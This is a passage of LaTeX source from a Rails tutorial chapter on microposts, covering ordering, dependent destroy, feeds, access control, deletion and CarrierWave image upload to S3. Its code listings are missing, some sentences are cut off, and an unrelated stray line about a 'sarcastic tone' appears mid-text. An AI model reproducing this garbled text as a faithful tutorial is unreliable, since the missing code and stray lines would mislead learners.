Of course, after this minor refactoring the test suite should still be \passing:
In this section, we'll add a couple of refinements to the user/micropost association.
In particular, we'll arrange for a user's microposts to be retrieved in a specific \emph{order}, and we'll also make microposts \emph{dependent} on users so that they will be automatically destroyed if their associated user is destroyed.
Default scope
By default, the \kode{user.microposts} method makes no guarantees about the order of the posts, but (following the convention of blogs and Twitter) we want the microposts to come out in reverse order of when they were created so that the most recent post is first
We briefly encountered a similar issue in Section~\ref{sec:updating_and_deleting_users_conclusion} in the context of the users index.
We'll arrange for this to happen using a \emph{default scope}.
This is exactly the sort of feature that could easily lead to a spurious passing test (i.e., a test that would pass even if the application code were wrong), so we'll proceed using test-driven development to be sure we're testing the right thing.
In particular, let's write a test to verify that the first micropost in the database is the same as a fixture micropost we'll call \kode{most\_recent}, as shown in Listing~\ref{code:micropost_order_test}.
Testing the micropost order. 
Listing~\ref{code:micropost_order_test} relies on having some micropost fixtures, which we define as shown in Listing~\ref{code:micropost_fixtures}.
Micropost fixtures.
Note that we have explicitly set the \kode{created\_at} column using embedded Ruby.
Because it's a ``magic'' column automatically updated by Rails, setting it by hand isn't ordinarily possible, but it is possible in fixtures.
In practice this might not be necessary, and in fact on many systems the fixtures are created in order.
In this case, the final fixture in the file is created last (and hence is most recent), but it would be foolish to rely on this behavior, which is brittle and probably system-dependent.
in Listing~\ref{code:micropost_order_test} and
We'll get the test to pass using a Rails method called \kode{default\_scope}, which among other things can be used to set the default order in which elements are retrieved from the database.
To enforce a particular order, we'll include the \kode{order} argument in \kode{default\_scope}, which lets us order by the \kode{created\_at} column as follows:
To pull them out in reverse order, we can push down one level deeper and include a string with some raw SQL:
SQL is case-insensitive, but it is conventional to write SQL keywords (such as \kode{DESC}) in all-caps.
In older versions of Rails, using this raw SQL used to be the only option to get the desired behavior, but as of Rails~4.0 we can use a more natural pure-Ruby syntax as well:
Adding this in a default scope for the Micropost model gives Listing~\ref{code:micropost_ordering}.
Ordering the microposts with \kode{default\_scope}. 
Listing~\ref{code:micropost_ordering} introduces the ``stabby lambda'' syntax for an object called a \emph{Proc} (procedure) or \emph{lambda}, which is an \emph{anonymous function} (a function created without a name).
The stabby lambda \kode{->} takes in a block (Section~\ref{sec:blocks}) and returns a Proc, which can then be evaluated with the \kode{call} method.
We can see how it works at the console:
=> #<Proc:0x007fab938d0108@(irb):1 (lambda)>
(This is a somewhat advanced Ruby topic, so don't worry if it doesn't make sense right away.)
With the code in Listing~\ref{code:micropost_ordering}, the tests should be \passing:
Dependent: destroy
Apart from proper ordering, there is a second refinement we'd like to add to microposts.
Recall from Section~\ref{sec:deleting_users} that site administrators have the power to \emph{destroy} users.
It stands to reason that, if a user is destroyed, the user's microposts should be destroyed as well.
We can arrange for this behavior by passing an option to the \kode{has\_many} association method, as shown in Listing~\ref{code:micropost_dependency}.
Ensuring that a user's microposts are destroyed along with the user.
Here the option \kode{dependent: :destroy} arranges for the dependent microposts to be destroyed when the user itself is destroyed.
This prevents userless microposts from being stranded in the database when admins choose to remove users from the system.
We can verify that Listing~\ref{code:micropost_dependency} is working with a test for the User model.
All we need to do is save the user (so it gets an id) and create an associated micropost.
Then we check that destroying the user reduces the micropost count by 1.
The result appears in Listing~\ref{code:dependent_destroy_test}
(Compare to the integration test for ``delete'' links in Listing~\ref{code:delete_link_integration_test}.)
A test of \kode{dependent: :destroy}. 
If the code in Listing~\ref{code:micropost_dependency} is working correctly, the test suite should still be \passing:
Although we don't yet have a way to create microposts through the web---that comes in Section~\ref{sec:creating_microposts}---this won't stop us from displaying them (and testing that display).
Following Twitter's lead, we'll plan to display a user's microposts not on a separate microposts \kode{index} page but rather directly on the user \kode{show} page itself, as mocked up in Figure~\ref{fig:user_microposts_mockup}.
We'll start with fairly simple ERb templates for adding a micropost display to the user profile, and then we'll add microposts to the seed data from Section~\ref{sec:sample_users} so that we have something to display.
A mockup of a profile page with microposts.
\label{fig:user_microposts_mockup}}<n>\end{figure}<n><n>    \subsection{Rendering microposts} % (fold)<n>    \label{sec:rendering_microposts}<n><n>Our plan is to display the 
As we'll see, many of the ideas are similar to our work in Section~\ref{sec:showing_all_users} on showing all users.
Although we won't need the Microposts controller until Section~\ref{sec:manipulating_microposts}, we will need the views directory in just a moment, so let's generate the controller now:
Our primary purpose in this section is to render all the microposts for each user.
We saw in Section~\ref{sec:partial_refactoring} that the code
Note that we've used the \emph{ordered list} tag~\kode{ol} (as opposed to an unordered list~\kode{ul}) because microposts are listed in a particular order (reverse-chronological).
The corresponding partial appears in Listing~\ref{code:micropost_partial}.
A partial for showing a single micropost.
</span>
This uses the awesome \kode{time\_ago\_in\_words} helper method, whose meaning is probably clear and whose effect we will see in Section~\ref{sec:sample_microposts}.
Listing~\ref{code:micropost_partial} also adds a CSS~id for each micropost using
This is a generally good practice, as it opens up the possibility of manipulating individual microposts at a future date (using JavaScript, for example).
The next step is to address the difficulty of displaying a potentially large number of microposts.
We'll solve this problem the same way we solved it for users in Section~\ref{sec:pagination}, namely, using pagination.
As before, we'll use the \kode{will\_paginate} method:
If you compare this with the analogous line on the user index page, Listing~\ref{code:will_paginate_index_view}, you'll see that before we had just
This worked because, in the context of the Users controller, \kode{will\_paginate} \emph{assumes} the existence of an instance variable called \kode{@users} (which, as we saw in Section~\ref{sec:pagination}, should be of class \kode{ActiveRecord::Relation}).
Of course, this means that we will have to define such a variable in the user \kode{show} action (Listing~\ref{code:user_show_microposts_instance}).
Adding an \kode{@microposts} instance variable to the user \kode{show} action.
Notice here how clever \kode{paginate} is---it even works \emph{through} the microposts association, reaching into the \texttt{microposts} table and pulling out the desired page of microposts.
Our final task is to display the number of microposts for each user, which we can do with the \kode{count} method:
As with \kode{paginate}, we can use the \kode{count} method through the association.
In particular, \kode{count} does \emph{not} pull all the microposts out of the database and then call \kode{length} on the resulting array, as this would become inefficient as the number of microposts grew.
Instead, it performs the calculation directly in the database, asking the database to count the microposts with the given \kode{user\_id} (an operation for which all databases are highly optimized).
(In the unlikely event that finding the count is still a bottleneck in your application, you can make it even faster using a \href{http://railscasts.com/episodes/23-counter-cache-column}{\emph{counter cache}}.)
Putting all the elements above together, we are now in a position to add microposts to the profile page, as shown in Listing~\ref{code:user_show_microposts}.
Note the use of \kode{if @user.microposts.any?}\ (a construction we saw before in Listing~\ref{code:errors_partial}), which makes sure that an empty list won't be displayed when the user has no microposts.
Adding microposts to the user \kode{show} page.
At this point, we can get a look at our updated user profile page in Figure~\ref{fig:user_profile_no_microposts}.
Of course, this is because there are not currently any microposts.
It's time to change that.
The user profile page with code for microposts---but no microposts.
With all the work making templates for user microposts in Section~\ref{sec:rendering_microposts}, the ending was rather anticlimactic.
We can rectify this sad situation by adding microposts to the seed data from Section~\ref{sec:sample_users}.
Adding sample microposts for \emph{all} the users actually takes a rather long time, so first we'll select just the first six users (i.e., the five users with custom Gravatars, and one with the default Gravatar) using the \kode{take} method:
Tail your \kode{log/development.log} file if you're curious about the SQL this method generates.
The call to \kode{order} ensures that we find the first six users that were created.
For each of the selected users, we'll make 50 microposts (plenty to overflow the pagination limit of~30).
in Listing~\ref{code:sample_microposts}.
(The reason for the order of the loops in Listing~\ref{code:sample_microposts} is to intermix the microposts for use in the status feed (Section~\ref{sec:the_status_feed}).
Looping over the users first gives feeds with big runs of microposts from the same user, which is visually unappealing.)
Adding microposts to the sample data.
At this point, we can reseed the development database as usual:
You should also quit and restart the Rails development server.
By design, the Faker gem's \emph{lorem ipsum} text is randomized, so the contents of your sample microposts will differ.
The user profile with unstyled microposts.
The page shown in Figure~\ref{fig:user_profile_microposts_no_styling} has no micropost-specific styling, so let's add some (Listing~\ref{code:micropost_css}) and take a look at the resulting pages
For convenience, Listing~\ref{code:micropost_css} actually has \emph{all} the CSS needed for this chapter.
The CSS for microposts (including all the CSS for this chapter).
Figure~\ref{fig:user_profile_with_microposts} shows the user profile page for the first user, while Figure~\ref{fig:other_profile_with_microposts} shows the profile for a second user.
Finally, Figure~\ref{fig:user_profile_microposts} shows the \emph{second} page of microposts for the first user, along with the pagination links at the bottom of the display.
In all three cases, observe that each micropost display indicates the time since it was created (e.g., ``Posted 1 minute ago.''); this is the work of the \kode{time\_ago\_in\_words} method from Listing~\ref{code:micropost_partial}.
If you wait a couple of minutes and reload the pages, you'll see how the text gets automatically updated based on the new time.
The user profile with microposts (\href{http://localhost:3000/users/1}{/users/1}).
The profile of a different user, also with microposts (\href{http://localhost:3000/users/5}{/users/5}).
Because newly activated users get redirected to their profile pages, we already have a test that the profile page renders correctly (Listing~\ref{code:signup_with_account_activation_test}).
In this section, we'll write a short integration test for some of the other elements on the profile page, including the work from this section.
We'll start by generating an integration test for the profiles of our site's users:
To test the micropost display on the profile, we need to associate the fixture microposts with a user.
Rails includes a convenient way to build associations in fixtures, like this:
By identifying the \kode{user} as \kode{michael}, we tell Rails to associate this micropost with the corresponding user in the users fixture:
To test micropost pagination, we'll also generate some additional micropost fixtures using the same embedded Ruby technique we used to make additional users in Listing~\ref{code:users_fixtures_extra_users}:
Putting all this together gives the updated micropost fixtures in Listing~\ref{code:updated_micropost_fixtures}.
Micropost fixtures with user associations.
With the test data thus prepared, the test itself is fairly straightforward: we visit the user profile page and check for the page title and the user's name, Gravatar, micropost count, and paginated microposts.
The result appears in Listing~\ref{code:user_profile_test}
Note the use of the \kode{full\_title} helper from Listing~\ref{code:title_helper} to test the page's title, which we gain access to by including the Application Helper module into the test
If you'd like to refactor other tests to use \kode{full\_title} (such as those in Listing~\ref{code:base_title_test}), you should include the Application Helper in \kode{test\_helper.rb} instead.
A test for the user profile. 
The micropost count assertion in Listing~\ref{code:user_profile_test} uses \kode{response.body}, which we saw briefly in the Chapter~\ref{cha:account_activation_and_password_reset} exercises (Section~\ref{sec:activation_resets_exercises}).
Despite its name, \kode{response.body} contains the full HTML source of the page (and not just the page's body).
This means that if all we care about is that the number of microposts appears \emph{somewhere} on the page, we can look for a match as follows:
This is a much less specific assertion than \kode{assert\_select}; in particular, unlike \kode{assert\_select}, using \kode{assert\_match} in this context doesn't require us to indicate which HTML tag we're looking for.
This checks for an \kode{img} tag with class \kode{gravatar} \emph{inside} a top-level heading tag (\kode{h1}).
Because the application code was working, the test suite should be \passing:
Having finished both the data modeling and display templates for microposts, we now turn our attention to the interface for creating them through the web.
In this section, we'll also see the first hint of a \emph{status feed}---a notion brought to full fruition in Chapter~\ref{cha:following_users}.
Finally, as with users, we'll make it possible to destroy microposts through the web.
There is one break with past convention worth noting: the interface to the Microposts resource will run principally through the Profile and Home pages, so we won't need actions like \kode{new} or \kode{edit} in the Microposts controller; we'll need only \kode{create} and \kode{destroy}.
This leads to the routes for the Microposts resource shown in Listing~\ref{code:microposts_resource}.
The code in Listing~\ref{code:microposts_resource} leads in turn to the RESTful routes shown in Table~\ref{table:RESTful_microposts}, which is a small subset of the full set of routes seen in Table~\ref{table:demo_RESTful_microposts}.
Of course, this simplicity is a sign of being \emph{more} advanced, not less---we've come a long way since our reliance on scaffolding in Chapter~\ref{cha:a_toy_app}, and we no longer need most of its complexity.
Routes for the Microposts resource.
RESTful routes provided by the Microposts resource in Listing~\ref{code:microposts_resource}.
\label{table:RESTful_microposts}}<n>\end{table}<n><n>    \subsection{Micropost access control} % (fold)<n>    \label{sec:micropost_access_control}<n><n>
We begin our development of the Microposts resource with some access control in the Microposts controller.
In particular, because we access microposts through their associated users, both the \kode{create} and \kode{destroy} actions must require users to be logged in.
Tests to enforce logged-in status mirror those for the Users controller (Listing~\ref{code:edit_update_redirect_tests} and Listing~\ref{code:action_tests_admin}).
We simply issue the correct request to each action and confirm that the micropost count is unchanged and the result is redirected to the login URL, as seen in Listing~\ref{code:create_destroy_micropost_tests}.
Authorization tests for the Microposts controller. 
Writing the application code needed to get the tests in Listing~\ref{code:create_destroy_micropost_tests} to pass requires a little refactoring first.
Recall from Section~\ref{sec:requiring_logged_in_users} that we enforced the login requirement using a before filter that called the \kode{logged\_in\_user} method (Listing~\ref{code:authorize_before_filter}).
At the time, we needed that method only in the Users controller, but now we find that we need it in the Microposts controller as well, so we'll move it into the Application controller, which is the base class of all controllers (Section~\ref{sec:a_controller_class}).
The result appears in Listing~\ref{code:sessions_helper_authenticate}
Moving the \kode{logged\_in\_user} method into the Application controller.
store_location
To avoid code repetition, you should also remove \kode{logged\_in\_user} from the Users controller at this time.
With the code in Listing~\ref{code:sessions_helper_authenticate}, the \kode{logged\_in\_user} method is now available in the Microposts controller, which means that we can add \kode{create} and \kode{destroy} actions and then restrict access to them using a before filter, as shown in Listing~\ref{code:microposts_controller_access_control}.
Adding authorization to the Microposts controller actions. 
At this point, the tests should pass:
In Chapter~\ref{cha:sign_up}, we implemented user signup by making an HTML form that issued an HTTP \texttt{POST} request to the \kode{create} action in the Users controller.
The implementation of micropost creation is similar; the main difference is that, rather than using a separate page at /microposts/new, we will put the form on the Home page itself (i.e., the root path~/), as mocked up in Figure~\ref{fig:home_page_with_micropost_form_mockup}.
A mockup of the Home page with a form for creating microposts.
When we last left the Home page, it appeared as in Figure~\ref{fig:sample_app_logo}---that is, it had a ``Sign up now!'' button in the middle.
Since a micropost creation form makes sense only in the context of a particular logged-in user, one goal of this section will be to serve different versions of the Home page depending on a visitor's login status.
We'll implement this in Listing~\ref{code:microposts_home_page} below.
as seen in Listing~\ref{code:microposts_create_action}.
Note the use of strong parameters via \kode{micropost\_params}, which permits only the micropost's \kode{content} attribute to be modified through the web.
The Microposts controller \kode{create} action.
To build a form for creating microposts, we use the code in Listing~\ref{code:microposts_home_page}, which serves up different HTML based on whether the site visitor is logged in or not.
Adding microposts creation to the Home page (\href{http://localhost:3000/}{/}).
(Having so much code in each branch of the \kode{if}-\kode{else} conditional is a bit messy, and cleaning it up using partials is left as an exercise (Section~\ref{sec:micropost_exercises}).)
To get the page defined in Listing~\ref{code:microposts_home_page} working, we need to create and fill in a couple of partials.
The first is the new Home page sidebar, as shown in Listing~\ref{code:user_info}.
The partial for the user info sidebar.
Note that, as in the profile sidebar (Listing~\ref{code:user_show_microposts}), the user info in Listing~\ref{code:user_info} displays the total number of microposts for the user.
There's a slight difference in the display, though; in the profile sidebar, ``Microposts'' is a label, and showing ``Microposts (1)'' makes sense.
In the present case, though, saying ``1 microposts'' is ungrammatical, so we arrange to display ``1 micropost'' and ``2 microposts'' using the \kode{pluralize} method we saw in Section~\ref{sec:signup_error_messages}.
We next define the form for creating microposts (Listing~\ref{code:micropost_form}), which is similar to the signup form in Listing~\ref{code:signup_form}.
The form partial for creating microposts.
We need to make two changes before the form in Listing~\ref{code:micropost_form} will work.
First, we need to define \kode{@micropost}, which (as before) we do through the association:
The result appears in Listing~\ref{code:micropost_instance_variable}
Adding a micropost instance variable to the \kode{home} action.
The second change needed to get Listing~\ref{code:micropost_form} to work is to redefine the error-messages partial so the following code from Listing~\ref{code:micropost_form} works:
You may recall from Listing~\ref{code:f_error_messages} that the error-messages partial references the \kode{@user} variable explicitly, but in the present case we have an \kode{@micropost} variable instead.
To unify these cases, we can pass the form variable~\kode{f} to the partial and access the associated object through \kode{f.object}, so that in
\kode{f.object} is \kode{@user}, and in
\kode{f.object} is \kode{@micropost}, etc.
To pass the object to the partial, we use a hash with value equal to the object and key equal to the desired name of the variable in the partial, which is what the second line in Listing~\ref{code:micropost_form} accomplishes.
In other words, \kode{object: f.object} creates a variable called \kode{object} in the \kode{error\_messages} partial, and we can use it to construct a customized error message, as shown in Listing~\ref{code:updated_error_messages_partial}.
Error messages that work with other objects. 
This is a hint that we need to update the other occurrences of the error-messages partial, which we used when signing up users (Listing~\ref{code:f_error_messages}), resetting passwords (Listing~\ref{code:password_reset_form}), and editing users (Listing~\ref{code:user_edit_view}).
The updated versions are shown in Listing~\ref{code:signup_errors_updated}, Listing~\ref{code:password_reset_updated}, and Listing~\ref{code:edit_errors_updated}.
Updating the rendering of user signup errors.
Updating the errors for editing users.
Updating the errors for password resets.
At this point, all the tests should be \passing:
Additionally, all the HTML in this section should render properly, showing the form as in Figure~\ref{fig:home_with_form}, and a form with a submission error as in Figure~\ref{fig:home_form_errors}.
The Home page with a new micropost form.
The Home page with a form error.
Although the micropost form is actually now working, users can't immediately see the results of a successful submission because the current Home page doesn't display any microposts.
If you like, you can verify that the form shown in Figure~\ref{fig:home_with_form} is working by submitting a valid entry and then navigating to the \href{http://localhost:3000/users/1}{profile page} to see the post, but that's rather cumbersome.
It would be far better to have a \emph{feed} of microposts that includes the user's own posts, as mocked up in Figure~\ref{fig:proto_feed_mockup}.
(In Chapter~\ref{cha:following_users}, we'll generalize this feed to include the microposts of users being \emph{followed} by the current user.)
A mockup of the Home page with a proto-feed.
Since each user should have a feed, we are led naturally to a \kode{feed} method in the User model, which will initially just select all the microposts belonging to the current user.
We'll accomplish this using the \kode{where} method on the \kode{Micropost} model (seen briefly before in Section~\ref{sec:activation_resets_exercises}), as shown in Listing~\ref{code:proto_status_feed}
See the Rails Guide on the \href{http://guides.rubyonrails.org/active_record_querying.html}{Active Record Query Interface} for more on \kode{where} and related methods.
A preliminary implementation for the micropost status feed.
# Defines a proto-feed.
# See "Following users" for the full implementation.
The question mark in
ensures that \kode{id}~is properly \emph{escaped} before being included in the underlying SQL query, thereby avoiding a serious security hole called \href{http://en.wikipedia.org/wiki/SQL_injection}{\emph{SQL injection}}.
The \kode{id} attribute here is just an integer (i.e., \kode{self.id}, the unique ID of the user), so there is no danger of SQL injection in this case, but \emph{always} escaping variables injected into SQL statements is a good habit to cultivate.
Alert readers might note at this point that the code in Listing~\ref{code:proto_status_feed} is essentially equivalent to writing
We've used the code in Listing~\ref{code:proto_status_feed} instead because it generalizes much more naturally to the full status feed needed in Chapter~\ref{cha:following_users}.
To use the feed in the sample application, we add an \kode{@feed\_items} instance variable for the current user's (paginated) feed, as in Listing~\ref{code:feed_instance_variable}, and then add a status feed partial (Listing~\ref{code:feed_partial}) to the Home page (Listing~\ref{code:home_with_feed}).
Note that, now that there are two lines that need to be run when the user is logged in, Listing~\ref{code:feed_instance_variable} changes
from Listing~\ref{code:micropost_instance_variable} to
thereby moving the conditional from the end of the line to an if-end statement.
Adding a feed instance variable to the \kode{home} action.
The status feed partial.
The status feed partial defers the rendering to the micropost partial defined in Listing~\ref{code:micropost_partial}:
This causes Rails to look for a partial with the corresponding name in the views directory of the given resource:
We can add the feed to the Home page by rendering the feed partial as usual (Listing~\ref{code:home_with_feed}).
The result is a display of the feed on the Home page, as required (Figure~\ref{fig:home_with_proto_feed}).
Adding a status feed to the Home page.
The Home page with a proto-feed.
At this point, creating a new micropost works as expected, as seen in Figure~\ref{fig:micropost_created}.
There is one subtlety, though: on \emph{failed} micropost submission, the Home page expects an \kode{@feed\_items} instance variable, so failed submissions currently break.
The easiest solution is to suppress the feed entirely by assigning it an empty array, as shown in Listing~\ref{code:microposts_create_action_with_feed}.
(Unfortunately, returning a paginated feed doesn't work in this case.
Implement it and click on a pagination link to see why.)
The Home page after creating a new micropost.
Adding an (empty) \kode{@feed\_items} instance variable to the \kode{create} action.
The last piece of functionality to add to the Microposts resource is the ability to destroy posts.
As with user deletion (Section~\ref{sec:the_destroy_action}), we accomplish this with ``delete'' links, as mocked up in Figure~\ref{fig:micropost_delete_links_mockup}.
Unlike that case, which restricted user destruction to admin users, the delete links will work only for microposts created by the current user.
A mockup of the proto-feed with micropost delete links.
Our first step is to add a delete link to the micropost partial as in Listing~\ref{code:micropost_partial}.
The result appears in Listing~\ref{code:micropost_partial_with_delete}
Adding a delete link to the micropost partial.
The next step is to define a \kode{destroy} action in the Microposts controller, which is analogous to the user case in Listing~\ref{code:admin_destroy_before_filter}.
The main difference is that, rather than using an \kode{@user} variable with an \kode{admin\_user} before filter, we'll find the micropost through the association, which will automatically fail if a user tries to delete another user's micropost.
We'll put the resulting \kode{find} inside a \kode{correct\_user} before filter, which checks that the current user actually has a micropost with the given id.
The result appears in Listing~\ref{code:microposts_destroy_action}
The Microposts controller \kode{destroy} action.
Note that the \kode{destroy} method in Listing~\ref{code:microposts_destroy_action} redirects to the URL
This corresponds to \texttt{HTTP\_REFERER}, as defined by the specification for HTTP. Note that ``referer'' is not a typo---the word is actually misspelled in the spec.
Rails corrects this error by writing ``referrer'' instead.
I didn't remember offhand how to get this URL inside a Rails application, so I Googled ``rails request previous url'' and found a \href{http://stackoverflow.com/questions/4652084/ruby-on-rails-how-do-you-get-the-previous-url}{Stack Overflow thread} with the answer.
This is convenient because microposts appear on both the Home page and on the user's profile page, so by using \kode{request.referrer} we arrange to redirect back to the page issuing the delete request in both cases.
If the referring URL is \kode{nil} (as is the case inside some tests), Listing~\ref{code:microposts_destroy_action} sets the \kode{root\_url} as the default using the \kode{||} operator.
(Compare to the default options defined in Listing~\ref{code:test_helper_log_in}.)
With the code as above, the result of destroying the second-most recent post appears in Figure~\ref{fig:home_post_delete}.
The Home page after deleting the second-most-recent micropost.
With the code in Section~\ref{sec:destroying_microposts}, the Micropost model and interface are complete.
All that's left is writing a short Microposts controller test to check authorization and a micropost integration test to tie it all together.
We'll start by adding a few microposts with different owners to the micropost fixtures, as shown in Listing~\ref{code:add_micropost_different_owner}.
(We'll be using only one for now, but we've put in the others for future reference.)
Adding a micropost with a different owner.
I'm sorry.
Your words made sense, but your sarcastic tone did not.
We next write a short test to make sure one user can't delete the microposts of a different user, and we also check for the proper redirect, as seen in Listing~\ref{code:micropost_user_mismatch_test}.
Testing micropost deletion with a user mismatch. 
Finally, we'll write an integration test to log in, check the micropost pagination, make an invalid submission, make a valid submission, delete a post, and then visit a second user's page to make sure there are no ``delete'' links.
We start by generating a test as usual:
The test appears in Listing~\ref{code:microposts_interface_test}.
See if you can connect the lines in Listing~\ref{code:micropost_validity_test_idiomatic} to the steps mentioned above.
(Listing~\ref{code:microposts_interface_test} uses \kode{post} followed by \kode{follow\_redirect!}
An integration test for the micropost interface. 
Because we wrote working application code first, the test suite should be \passing:
Now that we've added support for all relevant micropost actions, in this section we'll make it possible for microposts to include images as well as text.
We'll start with a basic version good enough for development use, and then add a series of enhancements to make image upload production-ready.
Adding image upload involves two main visible elements: a form field for uploading an image and the micropost images themselves.
A mockup of the resulting ``Upload image'' button and micropost photo appears in Figure~\ref{fig:micropost_image_mockup}
A mockup of micropost image upload (with an uploaded image).
\label{fig:micropost_image_mockup}}<n>\end{figure}<n><n>\subsection{Basic image upload} % (fold)<n>\label{sec:basic_image_upload}<n><n>
To handle an uploaded image and associate it with the Micropost model, we'll use the \href{https://github.com/carrierwaveuploader/carrierwave}{CarrierWave} image uploader.
For completeness, Listing~\ref{code:gemfile_carrierwave} also includes the \texttt{mini\_magick} and \texttt{fog} gems needed for image resizing (Section~\ref{sec:image_resizing}) and image upload in production (Section~\ref{sec:image_upload_in_production}).
Then we install as usual:
CarrierWave adds a Rails generator for creating an image uploader, which we'll use to make an uploader for an image called \kode{picture}
Initially, I called the new attribute \kode{image}, but that name was so generic it ended up being confusing.
Images uploaded with CarrierWave should be associated with a corresponding attribute in an Active Record model, which simply contains the name of the image file in a string field.
The resulting augmented data model for microposts appears in Figure~\ref{fig:micropost_model_picture}.
The Micropost data model with a \kode{picture} attribute.
To add the required \kode{picture} attribute to the Micropost model, we generate a migration and migrate the development database:
The way to tell CarrierWave to associate the image with a model is to use the \kode{mount\_uploader} method, which takes as arguments a symbol representing the attribute and the class name of the generated uploader:
(Here \kode{PictureUploader} is defined in the file \kode{picture\_uploader.rb}, \linebreak which we'll start editing in Section~\ref{sec:image_validation}, but for now the generated default is fine.)
Adding the uploader to the Micropost model gives the code shown in Listing~\ref{code:micropost_model_picture}.
Adding an image to the Micropost model.
On some systems, you may need to restart the Rails server at this point to keep the test suite \passing.
(If you're using Guard as described in Section~\ref{sec:guard}, you may need to restart that as well, and it may even be necessary to exit the terminal shell and re-run Guard in a new one.)
To include the uploader on the Home page as in Figure~\ref{fig:micropost_image_mockup}, we need to include a \kode{file\_field} tag in the micropost form, as shown in Listing~\ref{code:micropost_create_image_upload}.
Adding image upload to the micropost create form.
Note the inclusion of
in the arguments to \kode{form\_for}, which is necessary for file uploads.
Finally, we need to add \kode{picture} to the list of attributes permitted to be modified through the web.
This involves editing the \kode{micropost\_params} method, as shown in Listing~\ref{code:micropost_params_picture}.
Adding \kode{picture} to the list of permitted attributes.
Once the image has been uploaded, we can render it using the \kode{image\_tag} helper in the micropost partial, as shown in Listing~\ref{code:micropost_partial_image_display}.
Notice the use of the \kode{picture?}\ boolean method to prevent displaying an image tag when there isn't an image.
This method is created automatically by CarrierWave based on the name of the image attribute.
The result of making a successful submission by hand appears in Figure~\ref{fig:micropost_with_image}.
Writing an automated test for image upload is left as an exercise (Section~\ref{sec:micropost_exercises}).
Adding image display to microposts.
The result of submitting a micropost with an image.
The uploader in Section~\ref{sec:basic_image_upload} is a good start, but it has significant limitations.
In particular, it doesn't enforce any constraints on the uploaded file, which can cause problems if users try to upload large files of invalid file types.
To remedy this defect, we'll add validations for the image size and format, both on the server and on the client (i.e., in the browser).
The first image validation, which restricts uploads to valid image types, appears in the CarrierWave uploader itself.
The resulting code (which appears as a commented-out suggestion in the generated uploader) verifies that the image filename ends with a valid image extension (PNG, GIF, and both variants of JPEG), as shown in Listing~\ref{code:validate_picture_format}.
The picture format validation.
The second validation, which controls the size of the image, appears in the Micropost model itself.
In contrast to previous model validations, file size validation doesn't correspond to a built-in Rails validator.
As a result, validating images requires defining a custom validation, which we'll call \kode{picture\_size} and define as shown in Listing~\ref{code:micropost_model_image_validation}.
Note the use of \kode{validate} (as opposed to \kode{validates}) to call a custom validation.
Adding validations to images.
This custom validation arranges to call the method corresponding to the given symbol (\kode{:picture\_size}).
To go along with the validations in Listing~\ref{code:validate_picture_format} and Listing~\ref{code:micropost_model_image_validation}, we'll add two client-side checks on the uploaded image.
We'll first mirror the format validation by using the \kode{accept} parameter in the \kode{file\_field} input tag:
The valid formats consist of the \href{https://en.wikipedia.org/wiki/Internet_media_type}{MIME types} accepted by the validation in  Listing~\ref{code:validate_picture_format}.
Next, we'll include a little JavaScript (or, more specifically, \href{http://jquery.com/}{jQuery}) to issue an alert if a user tries to upload an image that's too big (which prevents accidental time-consuming uploads and lightens the load on the server):
in Listing~\ref{code:micropost_create_image_upload}.
(The way to figure this out is to Ctrl-click and use your browser's web inspector.)
When the element with that CSS~id changes, the jQuery function fires and issues the \kode{alert} method if the file is too big
To learn how to do things like this, you can do what I did: Google around for things like ``javascript maximum file size'' until you find something on Stack Overflow.
The result of adding these additional checks appears in Listing~\ref{code:_format_jquery_file_test}.
Checking the file size with jQuery.
It's important to understand that code like that shown in Listing~\ref{code:_format_jquery_file_test} can't actually prevent a user from trying to upload a file that's too big.
Even if our code prevents them from submitting it through the web, they could always edit the JavaScript with a web inspector or issue a direct \texttt{POST} request using, e.g., \kode{curl}.
To prevent users from uploading arbitrarily large files, it is thus essential to include a server-side validation, as in Listing~\ref{code:micropost_model_image_validation}.
The image size validations in Section~\ref{sec:image_validation} are a good start, but they still allow the uploading of images large enough to break our site's layout, sometimes with frightening results (Figure~\ref{fig:large_uploaded_image}).
Thus, while it's convenient to allow users to select fairly large images from their local disk, it's also a good idea to resize the images before displaying them
It's possible to constrain the \emph{display} size with CSS, but this doesn't change the image size.
In particular, large images would still take a while to load.
(You've probably visited websites where ``small'' images seemingly take forever to load.
This is why.)
A frighteningly large uploaded image.
We'll be resizing images using the image manipulation program \href{http://www.imagemagick.org/}{ImageMagick}, which we need to install on the development environment.
(As we'll see in Section~\ref{sec:image_upload_in_production}, when using Heroku for deployment ImageMagick comes pre-installed in production.)
On the cloud IDE, we can do this as follows
I got this from the \href{https://help.ubuntu.com/community/ImageMagick}{official Ubuntu documentation}.
If you're not using the cloud IDE or an equivalent Linux system, do a Google search for ``imagemagick <your platform>''.
On OS~X, \kode{brew install imagemagick} should work if you have \href{http://brew.sh/}{Homebrew} installed.
Next, we need to include CarrierWave's \href{https://github.com/minimagick/minimagick}{MiniMagick} interface for ImageMagick, together with a resizing command.
For the resizing command, there are several possibilities listed in the \href{http://www.rdoc.info/github/jnicklas/carrierwave/CarrierWave/MiniMagick}{MiniMagick documentation}, but the one we want is \kode{resize\_to\_limit: [400, 400]}, which resizes large images so that they aren't any bigger than 400px in either dimension, while simultaneously leaving smaller images alone.
(The other main possibilities listed in the \href{https://github.com/carrierwaveuploader/carrierwave#using-minimagick}{CarrierWave documentation on MiniMagick} \emph{stretch} images if they're too small, which isn't what we want in this case.)
With the code as shown in Listing~\ref{code:image_uploader_resizing}, large images are now resized nicely (Figure~\ref{fig:resized_image}).
Configuring the image uploader for image resizing.
A nicely resized image.
The image uploader developed in Section~\ref{sec:image_resizing} is good enough for development, but (as seen in the \kode{storage :file} line in Listing~\ref{code:image_uploader_resizing}) it uses the local filesystem for storing the images, which isn't a good practice in production
Among other things, file storage on Heroku is temporary, so uploaded images will be deleted every time you deploy.
Instead, we'll use a cloud storage service to store images separately from our application
This is a challenging section and can be skipped without loss of continuity.
To configure our application to use cloud storage in production, we'll use the \texttt{fog} gem, as shown in Listing~\ref{code:image_uploader_production}.
Configuring the image uploader for production.
Listing~\ref{code:image_uploader_production} uses the \kode{production?}
S3 is a paid service, but the storage needed to set up and test the Rails Tutorial sample application costs less than a cent per month.
Sign up for an \href{http://aws.amazon.com/}{Amazon Web Services} account.
Create a user via \href{http://aws.amazon.com/iam/}{AWS Identity and Access Management (IAM)} and record the access key and secret key.
Create an S3 bucket (with a name of your choice) using the \href{https://console.aws.amazon.com/s3}{AWS Console}, and then grant read and write permission to the user created in the previous step.
Once you've created and configured your S3 account, you should create and fill the CarrierWave configuration file as shown in Listing~\ref{code:carrier_wave_configuration}.
Configuring CarrierWave to use S3.
